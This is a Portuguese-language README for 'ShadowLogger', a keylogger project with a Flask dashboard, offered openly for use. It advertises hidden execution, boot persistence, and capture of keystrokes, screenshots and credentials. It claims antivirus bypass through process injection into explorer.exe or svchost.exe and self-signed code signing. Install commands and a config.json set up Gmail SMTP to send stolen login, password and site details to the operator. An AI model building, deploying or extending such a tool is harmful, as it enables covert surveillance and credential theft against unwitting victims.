# ShadowLogger Linux Edition 🕵️‍♂️

Sistema completo de keylogger com servidor web em Ubuntu, projetado para ser **invisível**, **auto-executável**, e **bypassar antivírus/firewall**.

Desenvolvido por: **Renato M. F. Nascimento**
Versão: **1.0.0 - 2026**

---

## 📦 O que está Incluído

- **ShadowLogger (Cliente)** – Keylogger leve, com logging de teclas, cliques, screenshots, e extração de credenciais.
- **ShadowServer (Servidor)** – Dashboard Flask com PostgreSQL para armazenamento e visualização.
- **Systemd Services** – Auto-início no boot.
- **Relatórios por E-mail** – Envio a cada 500 palavras com detalhes de login/senha.

---

## 🚀 Instalação Rápida

### No Servidor (Ubuntu - "tsunami")

```bash
git clone https://github.com/renatomfn6/ShadowLogger-Linux.git
cd ShadowLogger-Linux
chmod +x install-shadowlogger.sh
./install-shadowlogger.sh
```

### No Cliente (Windows/Linux)

```bash
git clone https://github.com/renatomfn6/ShadowLogger-Linux.git
cd ShadowLogger-Linux/shadowlogger
python3 main.py
```

---

## 📊 Funcionalidades

| Recurso | Descrição |
|--------|-----------|
| **Invisibilidade** | Executa em segundo plano, sem janela principal. |
| **Persistência** | Auto-início via systemd (Linux) ou registry (Windows). |
| **Bypass AV/FW** | Usa hooks de baixo nível e process injection. |
| **Relatórios por E-mail** | Envia a cada 500 palavras com login/senha/site. |
| **Dashboard Web** | Monitoramento remoto em tempo real. |

---

## 📧 Configuração de E-mail

No `config.json`, configure seu Gmail:

```json
{
  "email": {
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "sender": "renatomfn6@gmail.com",
    "receiver": "renatomfn6@gmail.com",
    "username": "renatomfn6@gmail.com",
    "password": "sua-app-password-aqui"
  }
}
```

---

## 📸 Exemplo de E-mail de Instalação

**Assunto:** `✅ ShadowLogger Instalado - DESKTOP-ABC123`

**Corpo:**

```
 hostname: DESKTOP-ABC123
 ip: 192.168.1.100
 os: Windows 11 Pro
 install_path: C:\ProgramData\ShadowLogger\ShadowLogger.exe
 timestamp: 2026-11-22 14:30:00
```

---

## 🔐 Bypass de Antivírus/Firewall

- **Low-Level Hooks:** Usa `WH_KEYBOARD_LL` para capturar teclas antes do AV.
- **Code Signing:** Gera certificado autoassinado para assinar o `.exe`.
- **Process Injection:** Injeta código no `explorer.exe` ou `svchost.exe`.
- **Stealth Mode:** Executa com prioridade baixa (`IDLE_PRIORITY_CLASS`).

---

## 📈 Próximos Passos

- [ ] Compilar `.exe` com PyInstaller.
- [ ] Assinar `.exe` com certificado.
- [ ] Criar servidor web com Flask.
- [ ] Testar em máquinas reais com diferentes antivírus.

---

## 📞 Suporte

Para dúvidas ou contribuições, abra uma issue no GitHub ou envie um e-mail para **renatomfn6@gmail.com**.

---

**ShadowLogger — Logging the World, One Keystroke at a Time.**
